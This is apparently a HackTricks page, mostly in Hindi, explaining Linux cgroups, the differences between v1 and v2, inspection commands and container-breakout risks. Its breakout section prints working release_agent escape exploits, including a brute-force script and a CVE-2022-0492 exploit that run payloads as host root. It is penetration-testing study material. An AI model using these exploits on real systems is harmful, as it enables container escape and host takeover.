# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** कर्नेल का वह मैकेनिज़्म हैं जो प्रोसेसेस को अकाउंटिंग, सीमिटिंग, प्राथमिकता देने और नीति लागू करने के लिए समूहित करने में उपयोग होता है। अगर namespaces मुख्यतः संसाधनों के व्यू को अलग करने के बारे में हैं, तो cgroups मुख्यतः यह नियंत्रित करते हैं कि उन संसाधनों में से कोई प्रोसेस सेट कितना उपयोग कर सकता है और कुछ मामलों में वे किन संसाधन वर्गों के साथ इंटरैक्ट कर सकते हैं। Containers लगातार cgroups पर निर्भर करते हैं, भले ही उपयोगकर्ता उन्हें सीधे कभी न देखे, क्योंकि लगभग हर आधुनिक runtime को कर्नेल को यह बताने का तरीका चाहिए कि "ये प्रोसेसेस इस workload से संबंधित हैं, और इनके लिए ये resource नियम लागू होते हैं"।

इसी कारण container engines एक नए container को इसके अपने cgroup सबट्री में रखते हैं। एक बार जब प्रोसेस ट्री वहां आ जाता है, तो runtime मेमोरी को कैप कर सकता है, PIDs की संख्या सीमित कर सकता है, CPU उपयोग का वेट निर्धारित कर सकता है, I/O को नियंत्रित कर सकता है, और डिवाइस एक्सेस को प्रतिबंधित कर सकता है। प्रोडक्शन वातावरण में यह multi-tenant सुरक्षा और सामान्य ऑपरेशनल हाइजीन दोनों के लिए आवश्यक है। अर्थपूर्ण resource controls के बिना एक container मेमोरी खत्म कर सकता है, सिस्टम को प्रोसेसेस से भर सकता है, या CPU और I/O को इस तरह व्यक्तिगतरूप से कब्ज़ा कर सकता है कि होस्ट या पड़ोसी workloads अस्थिर हो जाएं।

सिक्योरिटी के नजरिए से, cgroups दो अलग तरीकों से मायने रखते हैं। पहला, खराब या गायब resource लिमिट्स सरल denial-of-service अटैक्स को सक्षम बनाती हैं। दूसरा, कुछ cgroup फीचर्स, खासकर पुराने **cgroup v1** सेटअप्स में, ऐतिहासिक रूप से जब कंटेनर के अंदर से लिखने योग्य रहते थे तो शक्तिशाली breakout primitives पैदा कर चुके हैं।

## v1 Vs v2

वाइल्ड में दो मुख्य cgroup मॉडल हैं। **cgroup v1** कई controller hierarchies एक्सपोज़ करता है, और पुराने exploit writeups अक्सर वहाँ उपलब्ध अजीब और कभी-कभी अधिक शक्तिशाली semantics के इर्द-गिर्द घूमते हैं। **cgroup v2** एक अधिक यूनिफाइड hierarchy और सामान्यतः साफ सुथरा व्यवहार पेश करता है। आधुनिक डिस्ट्रीब्यूशन्स बढ़ते हुए cgroup v2 को प्राथमिकता दे रहे हैं, लेकिन मिक्स्ड या लेगेसी वातावरण अभी भी मौजूद हैं, जिसका मतलब है कि रियल सिस्टम्स की समीक्षा करते समय दोनों मॉडल अभी भी प्रासंगिक हैं।

यह फर्क मायने रखता है क्योंकि कुछ सबसे प्रसिद्ध container breakout कहानियाँ, जैसे कि cgroup v1 में **`release_agent`** के दुरुपयोग, बहुत विशिष्ट रूप से पुराने cgroup व्यवहार से जुड़ी होती हैं। जो पाठक किसी ब्लॉग पर cgroup exploit देखता है और फिर उसे अंधाधुंध आधुनिक cgroup v2-ओनली सिस्टम पर लागू कर देता है, वह यह गलत समझ सकता है कि लक्ष्य पर वास्तव में क्या संभव है।

## Inspection

यह देखने का सबसे तेज़ तरीका कि आपका वर्तमान shell कहाँ स्थित है:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` फ़ाइल वर्तमान प्रक्रिया से संबंधित cgroup पथ दिखाती है।

एक आधुनिक cgroup v2 होस्ट पर, आप अक्सर एक एकीकृत प्रविष्टि देखेंगे। पुराने या हाइब्रिड होस्ट पर, आपको कई v1 कंट्रोलर पथ दिखाई दे सकते हैं।

एक बार जब आप पथ जान लें, तो सीमाएँ और वर्तमान उपयोग देखने के लिए आप `/sys/fs/cgroup` के अंतर्गत संबंधित फ़ाइलों की जाँच कर सकते हैं।

एक cgroup v2 होस्ट पर, निम्नलिखित कमांड्स उपयोगी होते हैं:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
ये फ़ाइलें बताती हैं कि कौन से controllers मौजूद हैं और किन्हें child cgroups को delegated किया गया है। यह delegation मॉडल rootless और systemd-managed environments में मायने रखता है, जहाँ runtime संभवतः केवल उस cgroup functionality के subset को ही नियंत्रित कर सकेगा जिसे parent hierarchy वास्तव में delegate करती है।

## Lab

प्रायोगिक रूप से cgroups को देखने का एक तरीका है एक memory-limited container चलाना:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
आप PID-limited container भी आज़मा सकते हैं:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
ये उदाहरण इसलिए उपयोगी हैं क्योंकि वे runtime flag को kernel फ़ाइल इंटरफेस से जोड़ने में मदद करते हैं। runtime जादू से नियम लागू नहीं कर रहा; यह संबंधित cgroup सेटिंग्स लिख रहा होता है और फिर kernel को उन्हें process tree के खिलाफ लागू करने देता है।

## Runtime Usage

Docker, Podman, containerd, और CRI-O सभी सामान्य ऑपरेशन के हिस्से के रूप में cgroups पर निर्भर करते हैं। अंतर आमतौर पर इस बात पर नहीं होता कि वे cgroups का उपयोग करते हैं या नहीं, बल्कि इस पर होता है कि **वे कौन से defaults चुनते हैं**, **वे systemd के साथ कैसे interact करते हैं**, **rootless delegation कैसे काम करती है**, और **कितनी configuration engine स्तर पर नियंत्रित होती है बनाम orchestration स्तर पर**।

Kubernetes में, resource requests और limits अंततः नोड पर cgroup configuration बन जाते हैं। Pod YAML से kernel enforcement तक का पथ kubelet, CRI runtime, और OCI runtime से होकर गुजरता है, लेकिन cgroups फिर भी वही kernel मैकेनिज्म हैं जो अंततः नियम लागू करते हैं। Incus/LXC एनवायरनमेंट्स में भी cgroups भारी रूप से उपयोग होते हैं, खासकर क्योंकि system containers अक्सर एक समृद्ध process tree और अधिक VM-जैसी संचालन अपेक्षाएँ दिखाते हैं।

## Misconfigurations And Breakouts

क्लासिक cgroup सुरक्षा कहानी writable **cgroup v1 `release_agent`** मैकेनिज्म है। उस मॉडल में, अगर attacker सही cgroup फाइलों में लिख सकता है, `notify_on_release` को सक्षम कर सकता है, और `release_agent` में स्टोर किए गए पथ को नियंत्रित कर सकता है, तो cgroup खाली होने पर kernel host के initial namespaces में attacker-निर्धारित पथ को execute कर सकता है। इसलिए पुराने writeups cgroup controller writability, mount options, और namespace/capability शर्तों पर इतना ध्यान देते हैं।

यहाँ तक कि जब `release_agent` उपलब्ध नहीं भी होता, तब भी cgroup की गलतियाँ मायने रखती हैं। बहुत व्यापक device access container से host devices को पहुंच योग्य बना सकती है। missing memory और PID limits एक साधारण code execution को host DoS में बदल सकते हैं। rootless परिस्थितियों में कमजोर cgroup delegation भी defenders को यह मानने के लिए गुमराह कर सकती है कि कोई restriction मौजूद है जबकि runtime वास्तव में उसे लागू करने में सक्षम ही नहीं था।

### `release_agent` Background

`release_agent` तकनीक केवल **cgroup v1** पर लागू होती है। मूल विचार यह है कि जब किसी cgroup में आखिरी process exit करता है और `notify_on_release=1` सेट है, तो kernel उस प्रोग्राम को execute करता है जिसका पथ `release_agent` में स्टोर है। वह execution **initial namespaces on the host** में होती है, और यही writable `release_agent` को container escape primitive बनाता है।

इस तकनीक के काम करने के लिए, attacker को सामान्यतः चाहिए:

- writable **cgroup v1** hierarchy
- child cgroup बनाने या उपयोग करने की क्षमता
- `notify_on_release` सेट करने की क्षमता
- `release_agent` में पथ लिखने की क्षमता
- ऐसा पथ जो host के नज़रिए से किसी executable पर resolve हो

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
यह PoC `release_agent` में एक payload path लिखता है, cgroup release को ट्रिगर करता है, और फिर host पर जनरेट हुई आउटपुट फ़ाइल को पढ़ता है।

### पढ़ने योग्य वॉक-थ्रू

इसी विचार को चरणों में विभाजित करके समझना आसान होता है।

1. एक लिखने योग्य cgroup बनाएं और तैयार करें:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. कंटेनर फ़ाइल सिस्टम से संबंधित होस्ट पथ की पहचान करें:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. ऐसा payload डालें जो host path से दिखाई दे:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup को खाली करके निष्पादन ट्रिगर करें:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.

### `/proc/<pid>/root` का उपयोग करके रिलेटिव-पाथ वेरिएंट

कुछ वातावरणों में, container filesystem तक पहुँच के लिए होस्ट path स्पष्ट नहीं होता या उसे storage driver द्वारा छिपाया जाता है। उस मामले में payload path को `/proc/<pid>/root/...` के माध्यम से व्यक्त किया जा सकता है, जहाँ `<pid>` वर्तमान container में चल रही किसी process का होस्ट PID होता है। यह relative-path brute-force variant का आधार है:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
The relevant trick here is not the brute force itself but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host namespace, even when the direct host storage path is not known ahead of time.

### CVE-2022-0492 वैरिएंट

2022 में, CVE-2022-0492 ने दिखाया कि cgroup v1 में `release_agent` में लिखते समय `CAP_SYS_ADMIN` की जांच **प्रारम्भिक** user namespace में सही ढंग से नहीं की जा रही थी। इसने तकनीक को कमजोर कर्नेल्स पर काफी अधिक पहुँच योग्य बना दिया क्योंकि एक container process जो cgroup hierarchy को mount कर सकता था, वह host user namespace में पहले से privileged होने की आवश्यकता के बिना `release_agent` लिख सकता था।

न्यूनतम exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
एक vulnerable kernel पर, host `/proc/self/exe` को host root privileges के साथ execute करता है।

व्यावहारिक दुरुपयोग के लिए, शुरू करें यह जांचकर कि क्या environment अभी भी writable cgroup-v1 paths या dangerous device access को expose करता है:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
यदि `release_agent` मौजूद है और लिखने योग्य है, तो आप पहले से ही legacy-breakout territory में हैं:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
यदि cgroup path स्वयं किसी escape की अनुमति नहीं देता है, तो अगला व्यावहारिक उपयोग अक्सर denial of service या reconnaissance होता है:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
ये कमांड जल्दी बता देती हैं कि क्या workload के पास fork-bomb करने की जगह है, मेमोरी का अत्यधिक उपयोग करने की क्षमता है, या writable legacy cgroup interface का दुरुपयोग कर सकता है।

## Checks

किसी लक्ष्य की समीक्षा करते समय, cgroup checks का उद्देश्य यह जानना होता है कि कौन सा cgroup मॉडल इस्तेमाल में है, क्या container writable controller paths देखता है, और क्या पुराने breakout primitives जैसे कि `release_agent` यहाँ प्रासंगिक भी हैं।
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
यहाँ जो दिलचस्प है:

- यदि `mount | grep cgroup` **cgroup v1** दिखाता है, तो पुराने breakout writeups अधिक प्रासंगिक हो जाते हैं।
- यदि `release_agent` मौजूद है और पहुँच योग्य है, तो यह तुरंत गहरी जाँच के लायक है।
- यदि दिखाई देने वाला cgroup hierarchy writable है और container के पास strong capabilities भी हैं, तो उस environment को बहुत अधिक नज़दीकी समीक्षा की आवश्यकता है।

यदि आप **cgroup v1**, writable controller mounts, और ऐसा container पाते हैं जिसमें strong capabilities हों या weak seccomp/AppArmor संरक्षण हो, तो उस संयोजन को सावधानीपूर्वक ध्यान देने की आवश्यकता है। cgroups को अक्सर एक उबाऊ संसाधन-प्रबंधन विषय माना जाता है, लेकिन ऐतिहासिक रूप से वे कुछ सबसे शिक्षाप्रद container escape chains का हिस्सा रहे हैं, क्योंकि "resource control" और "host influence" के बीच की सीमा हमेशा उतनी साफ़ नहीं रहती थी जितना लोगों ने माना था।

## रनटाइम डिफॉल्ट्स

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | सामान्य मैनुअल कमजोरियाँ |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से सक्षम | Containers स्वचालित रूप से cgroups में रखे जाते हैं; resource limits वैकल्पिक होते हैं जब तक कि इन्हें flags के साथ सेट न किया गया हो | resource limits न देना जैसे `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | डिफ़ॉल्ट रूप से सक्षम | `--cgroups=enabled` डिफ़ॉल्ट है; cgroup namespace के डिफ़ॉल्ट cgroup version पर निर्भर करते हैं (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | रUNTIME के माध्यम से डिफ़ॉल्ट रूप से सक्षम | Pods और containers node runtime द्वारा cgroups में रखे जाते हैं; सूक्ष्म स्तर का resource control `resources.requests` / `resources.limits` पर निर्भर करता है | resource requests/limits न देना, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | डिफ़ॉल्ट रूप से सक्षम | cgroups सामान्य लाइफसाइकल प्रबंधन का हिस्सा होते हैं | डायरेक्ट runtime कॉन्फ़िग्स जो device controls को ढीला करते हैं या legacy writable cgroup v1 interfaces को एक्सपोज़ करते हैं |

महत्वपूर्ण अंतर यह है कि **cgroup का अस्तित्व** आमतौर पर डिफ़ॉल्ट होता है, जबकि **उपयोगी संसाधन सीमाएँ** अक्सर वैकल्पिक होती हैं जब तक कि स्पष्ट रूप से कॉन्फ़िगर न किया गया हो।
